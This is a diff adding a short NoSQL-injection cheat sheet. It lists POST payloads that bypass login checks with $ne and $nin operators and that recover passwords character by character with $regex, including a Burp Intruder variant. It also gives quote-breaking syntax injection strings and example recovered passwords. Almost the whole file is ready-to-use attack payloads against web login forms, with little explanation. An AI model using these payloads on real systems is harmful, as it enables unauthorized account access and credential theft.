@@ -1,0 +1,39 @@
+### nosqli ###
+
+## bypass login
+# filter on user not xxxx, password not yyyy
+['username'=>['$ne'=>'xxxx'], 'password'=>['$ne'=>'yyyy']]
+> POST user[$ne]=xxxx&pass[$ne]=yyyy&remember=on
+
+# filter on user not admin, password not yyyy
+['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'yyyy']]
+> POST user[$nin][]=admin&pass[$ne]=yyyy&remember=on
+
+# filter on user not admin/jude, password not yyyy
+['username'=>['$nin'=>['admin', 'jude'] ], 'password'=>['$ne'=>'yyyy']]
+> POST user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=yyyy&remember=on
+
+## find password
+# regex
+> POST user=admin&pass[$regex]=^.{8}$&remember=on
+> POST user=admin&pass[$regex]=^a.......$&remember=on
+> POST user=admin&pass[$regex]=^admi....$&remember=on
+> POST user=admin&pass[$regex]=^admin123$&remember=on
+> POST user=john&pass[$regex]=^10584312$&remember=on
+> POST user=pedro&pass[$regex]=^coolpass123$&remember=on
+
+# with burp
+> POST user=john&pass[$regex]=^§c§.......$ => with all letter/digit file
+
+
+## syntax injection
+admin'									# try qute
+admin' && 0 && 'x							# try AND 0
+admin' && 1 && 'x							# try AND 1
+admin' || 1 || 'x							# try OR 1
+
+
+
+
+
+
